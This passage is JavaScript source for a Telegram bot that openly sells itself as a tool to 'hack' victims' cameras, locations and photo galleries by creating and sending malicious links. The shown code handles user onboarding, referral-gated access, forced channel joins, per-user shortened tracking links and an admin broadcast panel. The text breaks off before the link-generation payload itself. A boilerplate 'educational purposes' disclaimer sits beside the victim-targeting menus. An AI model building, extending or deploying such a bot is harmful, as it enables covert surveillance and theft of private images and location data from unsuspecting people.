const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');
const isgd = require('isgd');
const { Buffer } = require('buffer');

// Environment Variables
const MONGO_URI = process.env.MONGO_URI;
const OWNER_ID = process.env.OWNER_ID;

if (!MONGO_URI || !OWNER_ID) {
  console.error('Missing environment variables: MONGO_URI or OWNER_ID');
  process.exit(1);
}

// MongoDB Connection - Cached for speed
let mongooseConnected = false;
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    mongooseConnected = true;
    console.log('Connected to MongoDB');
  })
  .catch((err) => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

// MongoDB Schemas
const BotSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  creatorId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const BotUserSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  userId: { type: String, required: true },
  username: { type: String },
  hasJoined: { type: Boolean, default: false },
  isFirstStart: { type: Boolean, default: true },
  language: { type: String, default: 'en' },
  referredBy: { type: String, default: 'none' },
  referralCount: { type: Number, default: 0 },
  isVip: { type: Boolean, default: false },
  isBlocked: { type: Boolean, default: false },
  adminState: { type: String, default: 'none' },
  lastInteraction: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const ChannelSchema = new mongoose.Schema({
  botToken: { type: String, required: true, unique: true },
  mainChannel: { type: String, default: 'https://t.me/Kali_Linux_BOTS' },
  customChannel: { type: String, default: null },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
const Bot = mongoose.model('Bot', BotSchema);
const BotUser = mongoose.model('BotUser', BotUserSchema);
const Channel = mongoose.model('Channel', ChannelSchema);

// Language Translations
const messages = {
  en: {
    selectLanguage: '🇺🇸 *Select the language of your preference from below to continue*\n┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n🇦🇫 برای ادامه، لطفاً نخست زبان مورد نظر خود را از گزینه زیر انتخاب کنید',
    langEnglish: '🇺🇸 English',
    langPersian: '🇮🇷 فارســی ',
    joinMessage: '⚠️ *⚠️ 𝙄𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙩𝙤 𝙟𝙤𝙞𝙣 𝙤𝙪𝙧 𝙩𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨.\n\nᴏᴛʜᴇʀᴡɪsᴇ ᴛʜɪs ʙᴏᴛ ᴡɪʟʟ ɴᴏᴛ ᴡᴏʀᴋ. Iғ ʏᴏᴜ ʜᴀᴠᴇ 🔐 𝗝𝗼𝗶𝗻𝗲𝗱 ᴛʜᴇ ᴄʜᴀɴɴᴇʟs. Tʜᴇɴ ᴄʟɪᴄᴋ ᴛʜᴇ Jᴏɪɴᴇᴅ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴғɪʀᴍ ʏᴏᴜʀ ʙᴏᴛ ᴍᴇᴍʙᴇʀsʜɪᴘ.:',
    joinMainChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷⚡️ ',
    joinCustomChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷⚡️',
    joinedButton: '🔐 𝗝𝗼𝗶𝗻𝗲𝗱 ',
    welcome: (username) => `Hᴇʏ 🖐 ${username}\n\nᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴏᴡᴇʀғᴜʟ ᴀɴᴅ ᴀᴅᴠᴀɴᴄᴇᴅ ʙᴏᴛ ғᴏʀ ʜᴀᴄᴋɪɴɢ.\nYᴏᴜ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ ᴛᴏ ʜᴀᴄᴋ ʏᴏᴜʀ ғʀɪᴇɴᴅs ᴀɴᴅ ᴏᴛʜᴇʀ's ᴘᴇᴏᴘʟᴇ *ᴄᴀᴍᴇʀᴀ, ɢᴀʟʟᴇʀʏ, sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀs, ʟᴏᴄᴀᴛɪᴏɴ, ᴄʟɪᴘʙᴏᴀʀᴅ ᴀɴᴅ ɪᴍᴘᴏʀᴛᴀɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ *ᴇᴀsɪʟʏ ᴡɪᴛʜ ɴᴏ ᴋɴᴏᴡʟᴇᴅɢᴇ ᴏғ ʜᴀᴄᴋɪɴɢ.👨‍💻\n\nᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ғʀᴏᴍ ʙᴇʟᴏᴡ ᴍᴇɴᴜ🔰`,
    menu: {
      camera: '❯ ℂ𝕒𝕞𝕖𝕣𝕒 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 🧿',
      location: '❯ 𝕃𝕠𝕔𝕒𝕥𝕚𝕠𝕟 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 🗺',
      gallery: '❯ 𝔾𝕒𝕝𝕝𝕖𝕣𝕪 ℍ𝕒𝕔𝕜𝕚𝕟𝕘  🖥',
      language: '𝐂𝐡𝐚𝐧𝐠𝐞 𝐋𝐚𝐧𝐠 | تغییر زبان',
    },
    cameraMessage: 'CAMERA HACKING\n\n> WELCOME TO OUR POWERFUL AND ADVANCED BOT. THROUGH OUR BOT YOU CAN HACK YOUR VICTIM\'S CAMERA BY CREATING AND SENDING A MALICIOUS LINK 👁️\n\n> WE ARE NOT RESPONSIBLE FOR YOUR ACTION, WE PROVIDE ONLY FOR EDUCATIONAL PURPOSES.\n\n> JOIN OUR SUPPORT CHANNEL',
    cameraLinkMessage: (url) => `*Hi* how are you this is your Camera link\n${url}`,
    locationMessage: 'LOCATION HACKING\n\n> WELCOME TO OUR POWERFUL AND ADVANCED BOT. THROUGH OUR BOT YOU CAN HACK YOUR VICTIM\'S LOCATION BY CREATING AND SENDING A MALICIOUS LINK 📍\n\n> WE ARE NOT RESPONSIBLE FOR YOUR ACTION, WE PROVIDE ONLY FOR EDUCATIONAL PURPOSES.\n\n> JOIN OUR SUPPORT CHANNEL',
    locationLinkMessage: (url) => `*Hi* my dear best friends this is your location link\n${url}`,
    galleryLocked: (current, link) =>
      `*Hi* you have not enough invites to access it your total invite: ${current}\nyour invite link: ${link}`,
    galleryMessage: 'GALLERY HACKING\n\n> WELCOME TO OUR POWERFUL AND ADVANCED BOT. THROUGH OUR BOT YOU CAN HACK YOUR VICTIM\'S GALLERY BY CREATING AND SENDING A MALICIOUS LINK 🖼️\n\n> WE ARE NOT RESPONSIBLE FOR YOUR ACTION, WE PROVIDE ONLY FOR EDUCATIONAL PURPOSES.\n\n> JOIN OUR SUPPORT CHANNEL',
    galleryLinkMessage: (url) => `*Hi* bei This is your gallery URL\n${url}`,
    createLink: 'Create Link 🛡️',
    mainMenu: 'Main Menu | مینوی اصلی',
    banned: 'You are banned from using this bot.',
    adminPanel: 'Admin Panel',
    adminMenu: {
      stats: '📊 Statistics',
      broadcast: '📍 Broadcast',
      setChannel: '🔗 Set Channel URL',
      blockUser: '🚫 Block',
      unblockUser: '🔓 Unlock',
      back: '↩️ Back',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 Statistics for @${username}\n\n` +
      `👥 Total Users: ${totalUsers}\n` +
      `📅 Bot Created: ${createdAt}\n` +
      `🔗 Main Channel URL: ${mainChannel}\n` +
      (customChannel ? `🔗 Custom Channel URL: ${customChannel}` : '🔗 Custom Channel URL: Not set'),
    broadcastPrompt: (totalUsers) => `📢 Send your message or content to broadcast to ${totalUsers} users:`,
    broadcastSuccess: (success, failed) => `📢 Broadcast completed!\n✅ Sent to ${success} users\n❌ Failed for ${failed} users`,
    broadcastCancel: '↩️ Broadcast cancelled.',
    setChannelPrompt: (mainChannel, customChannel) =>
      `🔗 Main Channel URL (Constant):\n${mainChannel}\n\n` +
      `🔗 Custom Channel URL:\n${customChannel || 'Not set'}\n\n` +
      `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel or @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ Custom Channel URL has been set to:\n${url}\nThe main channel URL remains:\n${mainChannel}`,
    invalidChannel: '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel or @your_channel).',
    blockPrompt: '🚫 Enter the user ID of the account you want to block from this bot:',
    blockSuccess: (userId) => `✅ User ${userId} has been blocked from this bot.`,
    unblockPrompt: '🔓 Enter the user ID of the account you want to unblock from this bot:',
    unblockSuccess: (userId) => `✅ User ${userId} has been unblocked from this bot.`,
    userNotFound: '❌ User not found in this bot.',
    invalidUserId: '❌ Invalid user ID. Please provide a numeric user ID (only numbers).',
    cannotBlockSelf: '❌ You cannot block yourself.',
    cancel: 'Cancel',
    back: '↩️ Back',
    error: '❌ An error occurred. Please try again.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `New User Joined!\n` +
      `Username: ${username}\n` +
      `User ID: ${userId}\n` +
      `Referred By: ${referredBy}\n` +
      `Total Users: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} joined using your link! Your total invites: ${total}`,
  },
  fa: {
    selectLanguage: 'لطفاً زبان خود را انتخاب کنید:\nPlease choose your language',
    langEnglish: 'انگلیسی',
    langPersian: 'فارسی',
    joinMessage: 'لطفاً برای ادامه به کانال(های) ما بپیوندید:',
    joinMainChannel: 'پیوستن به کانال اصلی',
    joinCustomChannel: 'پیوستن به کانال سفارشی',
    joinedButton: 'پیوستم',
    welcome: (username) => `خوش آمدید، ${username}! از منوی زیر استفاده کنید.`,
    menu: {
      camera: 'دوربین',
      location: 'موقعیت',
      gallery: 'گالری',
      language: 'زبان 🌐',
    },
    cameraMessage: 'هک دوربین\n\n> به ربات قدرتمند و پیشرفته ما خوش آمدید. از طریق ربات ما می‌توانید با ایجاد و ارسال یک لینک مخرب، دوربین قربانی خود را هک کنید 👁️\n\n> ما مسئول اقدامات شما نیستیم، ما فقط برای اهداف آموزشی ارائه می‌دهیم.\n\n> به کانال پشتیبانی ما بپیوندید',
    cameraLinkMessage: (url) => `*سلام* چطور هستید این لینک دوربین شماست\n${url}`,
    locationMessage: 'هک موقعیت\n\n> به ربات قدرتمند و پیشرفته ما خوش آمدید. از طریق ربات ما می‌توانید با ایجاد و ارسال یک لینک مخرب، موقعیت قربانی خود را هک کنید 📍\n\n> ما مسئول اقدامات شما نیستیم، ما فقط برای اهداف آموزشی ارائه می‌دهیم.\n\n> به کانال پشتیبانی ما بپیوندید',
    locationLinkMessage: (url) => `*سلام* دوستان عزیزم این لینک موقعیت شماست\n${url}`,
    galleryLocked: (current, link) =>
      `*سلام* شما دعوت کافی برای دسترسی ندارید، تعداد دعوت‌های شما: ${current}\nلینک دعوت شما: ${link}`,
    galleryMessage: 'هک گالری\n\n> به ربات قدرتمند و پیشرفته ما خوش آمدید. از طریق ربات ما می‌توانید با ایجاد و ارسال یک لینک مخرب، گالری قربانی خود را هک کنید 🖼️\n\n> ما مسئول اقدامات شما نیستیم، ما فقط برای اهداف آموزشی ارائه می‌دهیم.\n\n> به کانال پشتیبانی ما بپیوندید',
    galleryLinkMessage: (url) => `*سلام* بی این لینک گالری شماست\n${url}`,
    createLink: 'ایجاد لینک 🛡️',
    mainMenu: 'مینوی اصلی | Main Menu',
    banned: 'شما از استفاده از این ربات محروم شده‌اید.',
    adminPanel: 'پنل مدیریت',
    adminMenu: {
      stats: '📊 آمار',
      broadcast: '📍 پخش پیام',
      setChannel: '🔗 تنظیم آدرس کانال',
      blockUser: '🚫 مسدود کردن',
      unblockUser: '🔓 رفع مسدودیت',
      back: '↩️ بازگشت',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 آمار برای @${username}\n\n` +
      `👥 تعداد کاربران: ${totalUsers}\n` +
      `📅 تاریخ ایجاد ربات: ${createdAt}\n` +
      `🔗 آدرس کانال اصلی: ${mainChannel}\n` +
      (customChannel ? `🔗 آدرس کانال سفارشی: ${customChannel}` : '🔗 آدرس کانال سفارشی: تنظیم نشده'),
    broadcastPrompt: (totalUsers) => `📢 پیام یا محتوای خود را برای پخش به ${totalUsers} کاربر ارسال کنید:`,
    broadcastSuccess: (success, failed) => `📢 پخش پیام انجام شد!\n✅ ارسال به ${success} کاربر\n❌ ناموفق برای ${failed} کاربر`,
    broadcastCancel: '↩️ پخش پیام لغو شد.',
    setChannelPrompt: (mainChannel, customChannel) =>
      `🔗 آدرس کانال اصلی (ثابت):\n${mainChannel}\n\n` +
      `🔗 آدرس کانال سفارشی:\n${customChannel || 'تنظیم نشده'}\n\n` +
      `آدرس کانال سفارشی را برای افزودن به عنوان دکمه دوم پیوست وارد کنید (مثال: https://t.me/your_channel یا @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ آدرس کانال سفارشی تنظیم شد به:\n${url}\nآدرس کانال اصلی همچنان:\n${mainChannel}`,
    invalidChannel: '❌ آدرس نامعتبر است. لطفاً یک آدرس کانال تلگرام معتبر وارد کنید (مثال: https://t.me/your_channel یا @your_channel).',
    blockPrompt: '🚫 شناسه کاربری حسابی که می‌خواهید از این ربات مسدود کنید را وارد کنید:',
    blockSuccess: (userId) => `✅ کاربر ${userId} از این ربات مسدود شد.`,
    unblockPrompt: '🔓 شناسه کاربری حسابی که می‌خواهید از این ربات رفع مسدودیت کنید را وارد کنید:',
    unblockSuccess: (userId) => `✅ کاربر ${userId} از این ربات رفع مسدودیت شد.`,
    userNotFound: '❌ کاربر در این ربات یافت نشد.',
    invalidUserId: '❌ شناسه کاربری نامعتبر است. لطفاً یک شناسه کاربری عددی وارد کنید (فقط اعداد).',
    cannotBlockSelf: '❌ شما نمی‌توانید خودتان را مسدود کنید.',
    cancel: 'لغو',
    back: '↩️ بازگشت',
    error: '❌ خطایی رخ داد. لطفاً دوباره امتحان کنید.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `کاربر جدید پیوست!\n` +
      `نام کاربری: ${username}\n` +
      `شناسه کاربر: ${userId}\n` +
      `معرفی شده توسط: ${referredBy}\n` +
      `تعداد کل کاربران: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} با لینک شما پیوست! تعداد دعوت‌های شما: ${total}`,
  },
};

// Keyboards - Cached for performance
const keyboardCache = new Map();

const languageKeyboard = (lang) => {
  if (!keyboardCache.has(`lang_${lang}`)) {
    keyboardCache.set(`lang_${lang}`, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: messages[lang].langEnglish, callback_data: 'lang_en' },
            { text: messages[lang].langPersian, callback_data: 'lang_fa' },
          ],
        ],
      },
    });
  }
  return keyboardCache.get(`lang_${lang}`);
};

const joinKeyboard = (lang, mainChannel, customChannel) => {
  const key = `join_${lang}_${mainChannel}_${customChannel || 'none'}`;
  if (!keyboardCache.has(key)) {
    const keyboard = [
      [{ text: messages[lang].joinMainChannel, url: mainChannel }],
    ];
    if (customChannel) {
      keyboard.push([{ text: messages[lang].joinCustomChannel, url: customChannel }]);
    }
    keyboard.push([{ text: messages[lang].joinedButton, callback_data: 'joined' }]);
    keyboardCache.set(key, { reply_markup: { inline_keyboard: keyboard } });
  }
  return keyboardCache.get(key);
};

const mainMenuKeyboard = (lang) => {
  if (!keyboardCache.has(`menu_${lang}`)) {
    keyboardCache.set(`menu_${lang}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: messages[lang].menu.camera, callback_data: 'menu_camera' }],
          [{ text: messages[lang].menu.location, callback_data: 'menu_location' }],
          [{ text: messages[lang].menu.gallery, callback_data: 'menu_gallery' }],
          [{ text: messages[lang].menu.language, callback_data: 'menu_language' }],
        ],
      },
    });
  }
  return keyboardCache.get(`menu_${lang}`);
};

const mainMenuWithKeyboard = (lang) => {
  if (!keyboardCache.has(`menu_with_keyboard_${lang}`)) {
    keyboardCache.set(`menu_with_keyboard_${lang}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: messages[lang].menu.camera, callback_data: 'menu_camera' }],
          [{ text: messages[lang].menu.location, callback_data: 'menu_location' }],
          [{ text: messages[lang].menu.gallery, callback_data: 'menu_gallery' }],
          [{ text: messages[lang].menu.language, callback_data: 'menu_language' }],
        ],
        keyboard: [
          [{ text: messages[lang].mainMenu }],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });
  }
  return keyboardCache.get(`menu_with_keyboard_${lang}`);
};

const createLinkKeyboard = (lang) => {
  if (!keyboardCache.has(`create_${lang}`)) {
    keyboardCache.set(`create_${lang}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: messages[lang].createLink, callback_data: 'create_link' }],
        ],
      },
    });
  }
  return keyboardCache.get(`create_${lang}`);
};

const adminMenuKeyboard = (lang) => {
  if (!keyboardCache.has(`admin_${lang}`)) {
    keyboardCache.set(`admin_${lang}`, {
      reply_markup: {
        keyboard: [
          [
            { text: messages[lang].adminMenu.stats },
            { text: messages[lang].adminMenu.broadcast },
          ],
          [
            { text: messages[lang].adminMenu.setChannel },
            { text: messages[lang].adminMenu.blockUser },
          ],
          [
            { text: messages[lang].adminMenu.unblockUser },
            { text: messages[lang].adminMenu.back },
          ],
        ],
        resize_keyboard: true,
      },
    });
  }
  return keyboardCache.get(`admin_${lang}`);
};

const cancelKeyboard = (lang) => {
  if (!keyboardCache.has(`cancel_${lang}`)) {
    keyboardCache.set(`cancel_${lang}`, {
      reply_markup: {
        keyboard: [
          [{ text: messages[lang].cancel }],
        ],
        resize_keyboard: true,
      },
    });
  }
  return keyboardCache.get(`cancel_${lang}`);
};

// Helper Functions
const getFormattedDate = (timestamp) => {
  const date = new Date(timestamp * 1000);
  return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
};

const shortenUrl = async (longUrl, chatId, type) => {
  let prefix = type === 'camera' ? '1' : type === 'location' ? '2' : '3';
  const customSlug = `${prefix}${chatId}`;
  let ashlynnShortUrl = '';
  try {
    const response = await fetch(
      `https://api.ashlynn-repo.tech/short?url=${encodeURIComponent(longUrl)}&slug=${customSlug}`,
      { method: 'GET', signal: AbortSignal.timeout(5000) }
    );
    const data = await response.json();
    if (data.successful === 'success' && data.status === 200 && data.response?.link) {
      ashlynnShortUrl = data.response.link;
    }
  } catch (error) {}
  if (ashlynnShortUrl) return ashlynnShortUrl;
  return new Promise((resolve) => {
    isgd.shorten(longUrl, (shortUrl, error) => {
      resolve(error ? longUrl : shortUrl);
    });
  });
};

const encodeBase64 = (data, appendKs = false) => {
  if (appendKs) data += "Ks";
  return Buffer.from(data).toString('base64');
};

const broadcastMessage = async (bot, message, users, senderId) => {
  let success = 0, failed = 0;
  const promises = users.map(user => {
    if (user.userId === senderId) return Promise.resolve();
    return bot.telegram.sendMessage(user.userId, message.text || 'Unsupported message type')
      .then(() => success++)
      .catch(() => failed++);
  });
  await Promise.all(promises);
  return { success, failed };
};

// Main Handler
module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') return res.status(200).send('Bot is running.');
    const botToken = req.query.token;
    if (!botToken) return res.status(400).json({ error: 'Bot token is required.' });

    const botInfo = await Bot.findOne({ token: botToken });
    if (!botInfo) return res.status(404).json({ error: 'Bot not found.' });

    const bot = new Telegraf(botToken);
    const update = req.body;
    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
    const userId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;

    if (!chatId || !userId) return res.status(400).json({ error: 'Invalid update.' });

    let user = await BotUser.findOne({ botToken, userId });
    if (!user) {
      const username = update.message?.from?.username
        ? `@${update.message.from.username}`
        : update.message.from.first_name || 'User';
      const referredBy = update.message?.text?.startsWith('/start') && update.message.text.includes(' ')
        ? update.message.text.split(' ')[1]
        : 'none';

      user = await BotUser.create({
        botToken,
        userId,
        username,
        hasJoined: false,
        isFirstStart: true,
        language: 'en',
        referredBy,
        referralCount: 0,
        isVip: false,
        isBlocked: false,
        adminState: 'none',
      });

      const totalUsers = await BotUser.countDocuments({ botToken });
      const notification = messages['en'].newUserNotification(user.username, userId, user.referredBy, totalUsers);
      bot.telegram.sendMessage(botInfo.creatorId, notification);

      if (user.referredBy !== 'none' && /^\d+$/.test(user.referredBy)) {
        const referrer = await BotUser.findOne({ botToken, userId: user.referredBy });
        if (referrer) {
          referrer.referralCount = (referrer.referralCount || 0) + 1;
          await referrer.save();
          const referrerLang = referrer.language || 'en';
          const referralMessage = messages[referrerLang].referralNotification(user.username, referrer.referralCount);
          bot.telegram.sendMessage(user.referredBy, referralMessage);
        }
      }
    }

    const lang = user.language || 'en';
    user.lastInteraction = Math.floor(Date.now() / 1000);
    await user.save();

    if (user.isBlocked && userId !== botInfo.creatorId && userId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, messages[lang].banned);
      return res.status(200).json({ ok: true });
    }

    let channelInfo = await Channel.findOne({ botToken });
    if (!channelInfo) channelInfo = await Channel.create({ botToken });
    const mainChannel = channelInfo.mainChannel;
    const customChannel = channelInfo.customChannel;

    if (update.message) {
      const text = update.message.text;

      if (text?.startsWith('/start')) {
        if (user.isFirstStart) {
          await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, languageKeyboard(lang));
          user.isFirstStart = false;
          await user.save();
        } else if (!user.hasJoined) {
          await bot.telegram.sendMessage(chatId, messages[lang].joinMessage, joinKeyboard(lang, mainChannel, customChannel));
        } else {
          await bot.telegram.sendMessage(chatId, messages[lang].joinMessage, joinKeyboard(lang, mainChannel, customChannel));
        }
      }

      else if (text === '/panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (text === messages[lang].mainMenu) {
        await bot.telegram.sendMessage(chatId, `👨‍💻`, mainMenuWithKeyboard(lang));
      }

      else if (user.adminState === 'admin_panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].adminMenu.stats) {
          const totalUsers = await BotUser.countDocuments({ botToken });
          const createdAt = getFormattedDate(botInfo.createdAt);
          const stats = messages[lang].statsMessage(botInfo.username, totalUsers, createdAt, mainChannel, customChannel);
          await bot.telegram.sendMessage(chatId, stats, adminMenuKeyboard(lang));
        }

        else if (text === messages[lang].adminMenu.broadcast) {
          const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
          if (totalUsers === 0) {
            await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet.', adminMenuKeyboard(lang));
          } else {
            await bot.telegram.sendMessage(chatId, messages[lang].broadcastPrompt(totalUsers), cancelKeyboard(lang));
            user.adminState = 'awaiting_broadcast';
            await user.save();
          }
        }

        else if (text === messages[lang].adminMenu.setChannel) {
          await bot.telegram.sendMessage(chatId, messages[lang].setChannelPrompt(mainChannel, customChannel), cancelKeyboard(lang));
          user.adminState = 'awaiting_channel';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.blockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].blockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_block';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.unblockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].unblockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_unblock';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.back) {
          await bot.telegram.sendMessage(chatId, messages[lang].welcome(user.username), mainMenuWithKeyboard(lang));
          user.adminState = 'none';
          await user.save();
        }
      }

      else if (user.adminState === 'awaiting_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
        const { success, failed } = await broadcastMessage(bot, update.message, targetUsers, userId);
        await bot.telegram.sendMessage(chatId, messages[lang].broadcastSuccess(success, failed), adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_channel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        let channelUrl = text.trim();
        channelUrl = channelUrl.replace(/^@/, '').replace(/^(https?:\/\/)?/i, '').replace(/\/+$/, '');
        if (!/^t\.me\//i.test(channelUrl)) channelUrl = 't.me/' + channelUrl;
        const correctedUrl = 'https://' + channelUrl;

        const urlRegex = /^https:\/\/t\.me\/.+$/;
        if (!urlRegex.test(correctedUrl)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidChannel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        await Channel.findOneAndUpdate({ botToken }, { customChannel: correctedUrl }, { upsert: true });
        await bot.telegram.sendMessage(chatId, messages[lang].setChannelSuccess(correctedUrl, mainChannel), adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_block' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        if (targetUserId === userId) {
          await bot.telegram.sendMessage(chatId, messages[lang].cannotBlockSelf, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        targetUser.isBlocked = true;
        await targetUser.save();
        await bot.telegram.sendMessage(chatId, messages[lang].blockSuccess(targetUserId), adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_unblock' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        targetUser.isBlocked = false;
        await targetUser.save();
        await bot.telegram.sendMessage(chatId, messages[lang].unblockSuccess(targetUserId), adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }
    }

    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const callbackQueryId = update.callback_query.id;

      if (callbackData === 'lang_en') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['en'].joinMessage, joinKeyboard('en', mainChannel, customChannel));
      }

      else if (callbackData === 'lang_fa') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['fa'].joinMessage, joinKeyboard('fa', mainChannel, customChannel));
      }

      else if (callbackData === 'lang_en_menu') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['en'].welcome(user.username), mainMenuWithKeyboard('en'));
      }

      else if (callbackData === 'lang_fa_menu') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['fa'].welcome(user.username), mainMenuWithKeyboard('fa'));
      }

      else if (callbackData === 'joined') {
        user.hasJoined = true;
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for joining!');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages[lang].welcome(user.username), mainMenuWithKeyboard(lang));
      }

      else if (callbackData === 'menu_camera') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendPhoto(chatId, 'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg', {
          caption: messages[lang].cameraMessage,
          parse_mode: 'Markdown',
          reply_markup: createLinkKeyboard(lang).reply_markup,
        });
        user.adminState = 'awaiting_camera_link';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'menu_location') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendPhoto(chatId, 'https://mallucampaign.in/images/img_1709042709.jpg', {
          caption: messages[lang].locationMessage,
          parse_mode: 'Markdown',
          reply_markup: createLinkKeyboard(lang).reply_markup,
        });
